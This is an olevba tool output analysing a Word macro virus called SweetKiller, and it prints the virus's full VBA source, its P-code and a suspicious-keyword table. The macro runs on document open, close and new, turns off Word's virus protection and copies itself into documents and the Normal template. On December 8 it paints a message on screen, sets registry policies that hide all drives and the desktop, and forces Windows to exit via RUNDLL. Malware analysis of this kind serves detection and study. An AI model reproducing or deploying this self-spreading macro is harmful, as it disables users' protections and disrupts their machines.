olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.SweetKiller
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.SweetKiller - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SweetKiller.bas 
in file: Virus.MSWord.SweetKiller - OLE stream: 'Macros/VBA/SweetKiller'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim MainWindow As Long
Dim MainWindowDC As Long
Dim Pen As Long
Dim Brush As Long
Dim WindowsDir As String * 50
Dim ExitCommand As String

Type LOGFONT
        lfHeight As Long
        lfWidth As Long
        lfEscapement As Long
        lfOrientation As Long
        lfWeight As Long
        lfItalic As Byte
        lfUnderline As Byte
        lfStrikeOut As Byte
        lfCharSet As Byte
        lfOutPrecision As Byte
        lfClipPrecision As Byte
        lfQuality As Byte
        lfPitchAndFamily As Byte
        lfFaceName(50) As Byte
End Type

Dim MyFont As LOGFONT

Declare Function CreateFontIndirect Lib "gdi32" Alias "CreateFontIndirectA" (lpLogFont As LOGFONT) As Long
Declare Function SetTextColor Lib "gdi32" (ByVal hdc As Long, ByVal crColor As Long) As Long
Declare Function SetBkColor Lib "gdi32" (ByVal hdc As Long, ByVal crColor As Long) As Long


Declare Function GetActiveWindow Lib "user32" () As Long
Declare Function GetWindowDC Lib "user32" (ByVal hwnd As Long) As Long

Declare Function Rectangle Lib "gdi32" (ByVal hdc As Long, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function TextOut Lib "gdi32" Alias "TextOutA" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal lpString As String, ByVal nCount As Long) As Long

Declare Function CreatePen Lib "gdi32" (ByVal nPenStyle As Long, ByVal nWidth As Long, ByVal crColor As Long) As Long
Declare Function CreateSolidBrush Lib "gdi32" (ByVal crColor As Long) As Long

Declare Function SelectObject Lib "gdi32" (ByVal hdc As Long, ByVal hObject As Long) As Long
Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long

Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long






Function TimeReached() As Boolean
    If Month(Now) = 12 And Day(Now) = 8 Then
        TimeReached = True
    Else
        TimeReached = False
    End If
End Function

Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Create By SweetKiller "
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.SweetKiller.AutoOpen"
    If Not InDocument() Then
        GoInIt
    Else
        OutBreak
    End If
End Sub

Sub AutoClose()
Attribute AutoClose.VB_Description = "Created by SweetKiller"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.SweetKiller.AutoClose"
    If Not InDocument() Then
        GoInIt
    Else
        OutBreak
    End If
End Sub

Sub AutoNew()
    If Not InDocument() Then
        GoInIt
    Else
        OutBreak
    End If
End Sub

Function InDocument() As Boolean
    Dim item
    InDocument = False
    For Each item In ActiveDocument.VBProject.VBComponents
        If item.Name = "SweetKiller" Then InDocument = True
    Next
End Function

Function InTemplate() As Boolean
    Dim item
    InTemplate = False
    For Each item In NormalTemplate.VBProject.VBComponents
        If item.Name = "SweetKiller" Then InTemplate = True
    Next
End Function

Sub GoInIt()
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SweetKiller", Object:=wdOrganizerObjectProjectItems
End Sub


Sub OutBreak()
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    If Not InTemplate() Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SweetKiller", Object:=wdOrganizerObjectProjectItems
    End If
    If TimeReached Then
        
    
        With MyFont
            .lfHeight = 24
            .lfWidth = 10
            .lfEscapement = 0
            .lfOrientation = 0
            .lfWeight = 600
            .lfItalic = 0
            .lfUnderline = 0
            .lfStrikeOut = 0
            .lfCharSet = 1
            .lfOutPrecision = 0
            .lfClipPrecision = 0
            .lfQuality = 0
            .lfPitchAndFamily = 0
            .lfFaceName(0) = &HCB
            .lfFaceName(1) = &HCE
            .lfFaceName(2) = &HCC
            .lfFaceName(3) = &HE5
            .lfFaceName(4) = 0
        
        End With
    
        MainWindow = GetActiveWindow()

        MainWindowDC = GetWindowDC(MainWindow)

        Brush = CreateSolidBrush(RGB(0, 0, 255))
        Pen = CreatePen(0, 4, RGB(255, 0, 0))
    
        SelectObject MainWindowDC, Pen
        SelectObject MainWindowDC, Brush
        Rectangle MainWindowDC, 100, 200, 440, 300
        
        SelectObject MainWindowDC, CreateFontIndirect(MyFont)
        SetTextColor MainWindowDC, RGB(0, 255, 0)
        SetBkColor MainWindowDC, RGB(0, 0, 255)
        
        SetTextColor MainWindowDC, RGB(255, 255, 0)
        TextOut MainWindowDC, 120, 220, "Microsoft µÄ²úÆ·´æÔÚºÜ¶àÂ©¶´", 28
        TextOut MainWindowDC, 120, 250, "ÒÔºó²»ÒªÊ¹ÓÃ Microsoft Èí¼þ!", 28
        
        WindowsDir = Space(&H20)
        GetWindowsDirectory WindowsDir, 50
        ExitCommand = Left(WindowsDir, InStr(WindowsDir, vbNullChar) - 1)
        ExitCommand = ExitCommand + "\RUNDLL.EXE user.exe,exitwindowsexec"
        
        Dim KeyID As Long
        Dim result As Long
        result = RegCreateKey(&H80000001, "\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", KeyID)
        If result = 0 Then
            RegSetValueEx KeyID, "NoDrives", 0&, &H3, &HFFFFFFFF, &H4
            RegSetValueEx KeyID, "NoDesktop", 0&, &H4, &H1, &H4
        End If
        Shell ExitCommand
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.SweetKiller
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/SweetKiller - 10973 bytes
' Line #0:
' 	Dim 
' 	VarDefn MainWindow (As Long)
' Line #1:
' 	Dim 
' 	VarDefn MainWindowDC (As Long)
' Line #2:
' 	Dim 
' 	VarDefn Pen (As Long)
' Line #3:
' 	Dim 
' 	VarDefn Brush (As Long)
' Line #4:
' 	Dim 
' 	LitDI2 0x0032 
' 	VarDefn WindowsDir
' Line #5:
' 	Dim 
' 	VarDefn ExitCommand (As String)
' Line #6:
' Line #7:
' 	Type LOGFONT
' Line #8:
' 	DimImplicit 
' 	VarDefn lfHeight (As Long)
' Line #9:
' 	DimImplicit 
' 	VarDefn lfWidth (As Long)
' Line #10:
' 	DimImplicit 
' 	VarDefn lfEscapement (As Long)
' Line #11:
' 	DimImplicit 
' 	VarDefn lfOrientation (As Long)
' Line #12:
' 	DimImplicit 
' 	VarDefn lfWeight (As Long)
' Line #13:
' 	DimImplicit 
' 	VarDefn lfItalic (As Byte)
' Line #14:
' 	DimImplicit 
' 	VarDefn lfUnderline (As Byte)
' Line #15:
' 	DimImplicit 
' 	VarDefn lfStrikeOut (As Byte)
' Line #16:
' 	DimImplicit 
' 	VarDefn lfCharSet (As Byte)
' Line #17:
' 	DimImplicit 
' 	VarDefn lfOutPrecision (As Byte)
' Line #18:
' 	DimImplicit 
' 	VarDefn lfClipPrecision (As Byte)
' Line #19:
' 	DimImplicit 
' 	VarDefn lfQuality (As Byte)
' Line #20:
' 	DimImplicit 
' 	VarDefn lfPitchAndFamily (As Byte)
' Line #21:
' 	DimImplicit 
' 	OptionBase 
' 	LitDI2 0x0032 
' 	VarDefn lfFaceName (As Byte)
' Line #22:
' 	EndType 
' Line #23:
' Line #24:
' 	Dim 
' 	VarDefn MyFont
' Line #25:
' Line #26:
' 	FuncDefn (Declare Function CreateFontIndirect Lib "gdi32" (lpLogFont As ) As Long)
' Line #27:
' 	FuncDefn (Declare Function SetTextColor Lib "gdi32" (ByVal hdc As Long, ByVal crColor As Long) As Long)
' Line #28:
' 	FuncDefn (Declare Function SetBkColor Lib "gdi32" (ByVal hdc As Long, ByVal crColor As Long) As Long)
' Line #29:
' Line #30:
' Line #31:
' 	FuncDefn (Declare Function GetActiveWindow Lib "user32" () As Long)
' Line #32:
' 	FuncDefn (Declare Function GetWindowDC Lib "user32" (ByVal hwnd As Long) As Long)
' Line #33:
' Line #34:
' 	FuncDefn (Declare Function Rectangle Lib "gdi32" (ByVal hdc As Long, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long)
' Line #35:
' 	FuncDefn (Declare Function TextOut Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal lpString As String, ByVal nCount As Long) As Long)
' Line #36:
' Line #37:
' 	FuncDefn (Declare Function CreatePen Lib "gdi32" (ByVal nPenStyle As Long, ByVal nWidth As Long, ByVal crColor As Long) As Long)
' Line #38:
' 	FuncDefn (Declare Function CreateSolidBrush Lib "gdi32" (ByVal crColor As Long) As Long)
' Line #39:
' Line #40:
' 	FuncDefn (Declare Function SelectObject Lib "gdi32" (ByVal hdc As Long, ByVal hObject As Long) As Long)
' Line #41:
' 	FuncDefn (Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long)
' Line #42:
' Line #43:
' 	FuncDefn (Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #44:
' Line #45:
' 	FuncDefn (Declare Function RegCreateKey Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long)
' Line #46:
' 	FuncDefn (Declare Function RegSetValueEx Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As , ByVal cbData As Long) As Long)
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' 	FuncDefn (Function TimeReached() As Boolean)
' Line #54:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St TimeReached 
' Line #56:
' 	ElseBlock 
' Line #57:
' 	LitVarSpecial (False)
' 	St TimeReached 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	EndFunc 
' Line #60:
' Line #61:
' 	FuncDefn (Sub AutoOpen())
' Line #62:
' 	ArgsLd InDocument 0x0000 
' 	Not 
' 	IfBlock 
' Line #63:
' 	ArgsCall GoInIt 0x0000 
' Line #64:
' 	ElseBlock 
' Line #65:
' 	ArgsCall OutBreak 0x0000 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	EndSub 
' Line #68:
' Line #69:
' 	FuncDefn (Sub AutoClose())
' Line #70:
' 	ArgsLd InDocument 0x0000 
' 	Not 
' 	IfBlock 
' Line #71:
' 	ArgsCall GoInIt 0x0000 
' Line #72:
' 	ElseBlock 
' Line #73:
' 	ArgsCall OutBreak 0x0000 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	EndSub 
' Line #76:
' Line #77:
' 	FuncDefn (Sub AutoNew())
' Line #78:
' 	ArgsLd InDocument 0x0000 
' 	Not 
' 	IfBlock 
' Line #79:
' 	ArgsCall GoInIt 0x0000 
' Line #80:
' 	ElseBlock 
' Line #81:
' 	ArgsCall OutBreak 0x0000 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	EndSub 
' Line #84:
' Line #85:
' 	FuncDefn (Function InDocument() As Boolean)
' Line #86:
' 	Dim 
' 	VarDefn item
' Line #87:
' 	LitVarSpecial (False)
' 	St InDocument 
' Line #88:
' 	StartForVariable 
' 	Ld item 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #89:
' 	Ld item 
' 	MemLd New 
' 	LitStr 0x000B "SweetKiller"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St InDocument 
' 	EndIf 
' Line #90:
' 	StartForVariable 
' 	Next 
' Line #91:
' 	EndFunc 
' Line #92:
' Line #93:
' 	FuncDefn (Function InTemplate() As Boolean)
' Line #94:
' 	Dim 
' 	VarDefn item
' Line #95:
' 	LitVarSpecial (False)
' 	St InTemplate 
' Line #96:
' 	StartForVariable 
' 	Ld item 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #97:
' 	Ld item 
' 	MemLd New 
' 	LitStr 0x000B "SweetKiller"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St InTemplate 
' 	EndIf 
' Line #98:
' 	StartForVariable 
' 	Next 
' Line #99:
' 	EndFunc 
' Line #100:
' Line #101:
' 	FuncDefn (Sub GoInIt())
' Line #102:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #103:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #104:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "SweetKiller"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #105:
' 	EndSub 
' Line #106:
' Line #107:
' Line #108:
' 	FuncDefn (Sub OutBreak())
' Line #109:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #110:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #111:
' 	ArgsLd InTemplate 0x0000 
' 	Not 
' 	IfBlock 
' Line #112:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "SweetKiller"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #113:
' 	EndIfBlock 
' Line #114:
' 	Ld TimeReached 
' 	IfBlock 
' Line #115:
' Line #116:
' Line #117:
' 	StartWithExpr 
' 	Ld MyFont 
' 	With 
' Line #118:
' 	LitDI2 0x0018 
' 	MemStWith lfHeight 
' Line #119:
' 	LitDI2 0x000A 
' 	MemStWith lfWidth 
' Line #120:
' 	LitDI2 0x0000 
' 	MemStWith lfEscapement 
' Line #121:
' 	LitDI2 0x0000 
' 	MemStWith lfOrientation 
' Line #122:
' 	LitDI2 0x0258 
' 	MemStWith lfWeight 
' Line #123:
' 	LitDI2 0x0000 
' 	MemStWith lfItalic 
' Line #124:
' 	LitDI2 0x0000 
' 	MemStWith lfUnderline 
' Line #125:
' 	LitDI2 0x0000 
' 	MemStWith lfStrikeOut 
' Line #126:
' 	LitDI2 0x0001 
' 	MemStWith lfCharSet 
' Line #127:
' 	LitDI2 0x0000 
' 	MemStWith lfOutPrecision 
' Line #128:
' 	LitDI2 0x0000 
' 	MemStWith lfClipPrecision 
' Line #129:
' 	LitDI2 0x0000 
' 	MemStWith lfQuality 
' Line #130:
' 	LitDI2 0x0000 
' 	MemStWith lfPitchAndFamily 
' Line #131:
' 	LitHI2 0x00CB 
' 	LitDI2 0x0000 
' 	ArgsMemStWith lfFaceName 0x0001 
' Line #132:
' 	LitHI2 0x00CE 
' 	LitDI2 0x0001 
' 	ArgsMemStWith lfFaceName 0x0001 
' Line #133:
' 	LitHI2 0x00CC 
' 	LitDI2 0x0002 
' 	ArgsMemStWith lfFaceName 0x0001 
' Line #134:
' 	LitHI2 0x00E5 
' 	LitDI2 0x0003 
' 	ArgsMemStWith lfFaceName 0x0001 
' Line #135:
' 	LitDI2 0x0000 
' 	LitDI2 0x0004 
' 	ArgsMemStWith lfFaceName 0x0001 
' Line #136:
' Line #137:
' 	EndWith 
' Line #138:
' Line #139:
' 	ArgsLd GetActiveWindow 0x0000 
' 	St MainWindow 
' Line #140:
' Line #141:
' 	Ld MainWindow 
' 	ArgsLd GetWindowDC 0x0001 
' 	St MainWindowDC 
' Line #142:
' Line #143:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd CreateSolidBrush 0x0001 
' 	St Brush 
' Line #144:
' 	LitDI2 0x0000 
' 	LitDI2 0x0004 
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd CreatePen 0x0003 
' 	St Pen 
' Line #145:
' Line #146:
' 	Ld MainWindowDC 
' 	Ld Pen 
' 	ArgsCall SelectObject 0x0002 
' Line #147:
' 	Ld MainWindowDC 
' 	Ld Brush 
' 	ArgsCall SelectObject 0x0002 
' Line #148:
' 	Ld MainWindowDC 
' 	LitDI2 0x0064 
' 	LitDI2 0x00C8 
' 	LitDI2 0x01B8 
' 	LitDI2 0x012C 
' 	ArgsCall Rectangle 0x0005 
' Line #149:
' Line #150:
' 	Ld MainWindowDC 
' 	Ld MyFont 
' 	ArgsLd CreateFontIndirect 0x0001 
' 	ArgsCall SelectObject 0x0002 
' Line #151:
' 	Ld MainWindowDC 
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	ArgsCall SetTextColor 0x0002 
' Line #152:
' 	Ld MainWindowDC 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	ArgsCall SetBkColor 0x0002 
' Line #153:
' Line #154:
' 	Ld MainWindowDC 
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	ArgsCall SetTextColor 0x0002 
' Line #155:
' 	Ld MainWindowDC 
' 	LitDI2 0x0078 
' 	LitDI2 0x00DC 
' 	LitStr 0x001C "Microsoft µÄ²úÆ·´æÔÚºÜ¶àÂ©¶´"
' 	LitDI2 0x001C 
' 	ArgsCall TextOut 0x0005 
' Line #156:
' 	Ld MainWindowDC 
' 	LitDI2 0x0078 
' 	LitDI2 0x00FA 
' 	LitStr 0x001C "ÒÔºó²»ÒªÊ¹ÓÃ Microsoft Èí¼þ!"
' 	LitDI2 0x001C 
' 	ArgsCall TextOut 0x0005 
' Line #157:
' Line #158:
' 	LitHI2 0x0020 
' 	ArgsLd Space 0x0001 
' 	St WindowsDir 
' Line #159:
' 	Ld WindowsDir 
' 	LitDI2 0x0032 
' 	ArgsCall GetWindowsDirectory 0x0002 
' Line #160:
' 	Ld WindowsDir 
' 	Ld WindowsDir 
' 	Ld vbNullChar 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St ExitCommand 
' Line #161:
' 	Ld ExitCommand 
' 	LitStr 0x0024 "\RUNDLL.EXE user.exe,exitwindowsexec"
' 	Add 
' 	St ExitCommand 
' Line #162:
' Line #163:
' 	Dim 
' 	VarDefn KeyID (As Long)
' Line #164:
' 	Dim 
' 	VarDefn result (As Long)
' Line #165:
' 	LitHI4 0x0001 0x8000 
' 	LitStr 0x003C "\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	Ld KeyID 
' 	ArgsLd RegCreateKey 0x0003 
' 	St result 
' Line #166:
' 	Ld result 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #167:
' 	Ld KeyID 
' 	LitStr 0x0008 "NoDrives"
' 	LitDI4 0x0000 0x0000 
' 	LitHI2 0x0003 
' 	LitHI4 0xFFFF 0xFFFF 
' 	LitHI2 0x0004 
' 	ArgsCall RegSetValueEx 0x0006 
' Line #168:
' 	Ld KeyID 
' 	LitStr 0x0009 "NoDesktop"
' 	LitDI4 0x0000 0x0000 
' 	LitHI2 0x0004 
' 	LitHI2 0x0001 
' 	LitHI2 0x0004 
' 	ArgsCall RegSetValueEx 0x0006 
' Line #169:
' 	EndIfBlock 
' Line #170:
' 	Ld ExitCommand 
' 	ArgsCall Shell 0x0001 
' Line #171:
' 	EndIfBlock 
' Line #172:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |RUNDLL.EXE          |Executable file name                         |
|IOC       |user.exe            |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

